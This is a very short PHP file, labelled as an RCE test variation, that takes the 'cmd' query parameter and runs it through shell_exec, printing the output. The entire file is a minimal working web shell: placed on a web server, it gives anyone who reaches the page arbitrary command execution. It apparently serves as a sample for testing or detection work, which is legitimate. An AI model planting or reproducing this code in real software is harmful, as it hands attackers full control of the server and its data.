<?php
// RCE test variation #224
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>